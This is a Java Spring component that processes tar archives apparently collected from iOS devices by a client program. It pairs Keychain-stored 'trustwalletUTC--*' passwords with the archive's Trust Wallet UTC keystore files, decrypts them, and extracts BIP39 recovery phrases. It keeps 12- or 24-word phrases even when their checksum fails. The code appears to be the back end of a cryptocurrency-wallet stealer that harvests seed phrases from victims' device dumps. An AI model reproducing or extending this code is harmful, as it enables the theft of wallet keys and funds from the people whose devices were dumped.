package com.consumer.parse;

import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collection;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Component;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.consumer.util.Bip39Util;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

/**
 * Keychain trustwalletUTC--* 密码 + 归档内 UTC keystore 解密助记词。
 * 不要求路径含 keystore：客户端 tar 常把 Documents/keystore/UTC--* 截成 .../UTC--*。
 * 解密对齐 18：hex 32 字节优先，再 UTF-8。
 */
@Slf4j
@Component
@RequiredArgsConstructor
public class TrustWallet {

    private static final String UTC_PREFIX = "UTC--";
    private static final String ACCT_PREFIX = "trustwallet";

    private final Bip39Util bip39Util;

    public static boolean isTrustUtcPasswordAcct(String acct) {
        String a = StringUtils.trimToEmpty(acct);
        if (!a.startsWith(ACCT_PREFIX + UTC_PREFIX)) {
            return false;
        }
        return !a.toLowerCase(Locale.ROOT).contains("keystoremigration");
    }

    public static String utcFilenameFromAcct(String acct) {
        if (!isTrustUtcPasswordAcct(acct)) {
            return null;
        }
        return acct.substring(ACCT_PREFIX.length());
    }

    public List<String> recover(Path archive, Collection<String> prefixes, Map<String, String> utcPasswords) {
        List<String> phrases = new ArrayList<>();
        if (archive == null) {
            log.info("trust recover skip: no archive");
            return phrases;
        }
        if (utcPasswords == null || utcPasswords.isEmpty()) {
            log.info("trust recover skip: no utc passwords archive={}", archive);
            return phrases;
        }
        Set<String> seen = new LinkedHashSet<>();
        List<String> fallback = new ArrayList<>();
        for (String p : utcPasswords.values()) {
            if (StringUtils.isNotBlank(p) && !fallback.contains(p)) {
                fallback.add(p);
            }
        }
        // 客户端 tar 常把超长路径截成 ".../UTC--*"，不含 Documents/keystore，也不能用包内目录前缀过滤。
        ArchiveIO.walk(archive, null, (name, in, size) -> {
            String base = ArchiveIO.baseName(name);
            String bl = base.toLowerCase(Locale.ROOT);
            if (!base.startsWith(UTC_PREFIX) || bl.contains(".realm")) {
                ArchiveIO.skipFully(in, size);
                return;
            }
            byte[] raw = ArchiveIO.readLimited(in, 5_000_000);
            if (raw == null || raw.length == 0) {
                return;
            }
            int start = 0;
            while (start < raw.length && Character.isWhitespace((char) (raw[start] & 0xff))) {
                start++;
            }
            if (start >= raw.length || raw[start] != '{') {
                return;
            }
            JSONObject keystore;
            try {
                keystore = JSON.parseObject(new String(raw, StandardCharsets.UTF_8));
            } catch (Exception e) {
                return;
            }
            if (keystore == null) {
                return;
            }
            JSONObject crypto = keystore.getJSONObject("crypto");
            if (crypto == null) {
                crypto = keystore.getJSONObject("Crypto");
            }
            if (crypto == null) {
                return;
            }
            List<String> candidates = new ArrayList<>();
            String matched = utcPasswords.get(base);
            if (StringUtils.isNotBlank(matched)) {
                candidates.add(matched);
            }
            for (String p : fallback) {
                if (!candidates.contains(p)) {
                    candidates.add(p);
                }
            }
            log.info("trust utc candidate file={} size={} passwords={}", base, raw.length, candidates.size());
            for (String password : candidates) {
                byte[] plain = KeystoreV3.decryptTrust(crypto, password);
                if (plain == null) {
                    continue;
                }
                String text = new String(plain, StandardCharsets.UTF_8).replace("\0", "").trim();
                String norm = text.replaceAll("\\s+", " ");
                if (acceptPhrase(norm) && seen.add(norm)) {
                    phrases.add(norm);
                }
                break;
            }
        }, 5_000_000);
        if (!phrases.isEmpty()) {
            log.info("trust utc recovered phrases={}", phrases.size());
        }
        return phrases;
    }

    /** 对齐 18：校验通过必收；12/24 词即使 checksum 失败也收。 */
    private boolean acceptPhrase(String norm) {
        if (StringUtils.isBlank(norm)) {
            return false;
        }
        if (bip39Util.validateMnemonic(norm)) {
            return true;
        }
        String[] ws = norm.split("\\s+");
        return ws.length == 12 || ws.length == 24;
    }
}
